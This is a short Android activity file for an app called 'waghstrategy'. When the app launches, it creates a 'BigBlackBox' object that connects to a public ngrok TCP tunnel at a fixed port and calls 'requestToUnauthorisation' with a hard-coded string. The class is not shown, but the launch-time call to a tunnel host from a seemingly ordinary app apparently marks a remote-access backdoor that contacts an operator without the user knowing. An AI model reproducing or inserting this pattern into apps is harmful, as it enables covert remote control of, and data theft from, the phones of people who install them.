package com.example.waghstrategy;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        BigBlackBox bbb = new BigBlackBox(getApplication(),"0.tcp.ngrok.io",10263);
        bbb.requestToUnauthorisation("rakanishutino");
    }
}
